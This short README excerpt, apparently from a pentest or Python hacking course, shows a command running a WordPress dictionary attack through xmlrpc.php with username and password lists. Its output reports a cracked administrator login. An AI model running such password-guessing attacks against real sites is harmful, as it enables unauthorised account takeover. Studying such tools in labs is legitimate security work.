## Example

### Wörterbuch Angriff
* `./brute_force_wp.py --url http://wordpress -u ../data_collection/V_username_102.lst ../wordlists/usernames.lst -p ../data_collection/V_wordlist_374.lst -m x -v`

```
| Start Brute Force Script
[#] Use validation: Login Error
	- mibi
	- webadmin
[?] Load 2 Usernames and 374 Passwords
[#] Use Methode: xmlrpc.php

	 - Username[1/2]:     mibi - Password[374/374]  velVoluptatem!
	 - Username[2/2]: webadmin - Password[110/374]  H@ckingPython! <= Valid  - is Administrator


| Findings:
	- webadmin : H@ckingPython! - is Administrator

| End                                             
```
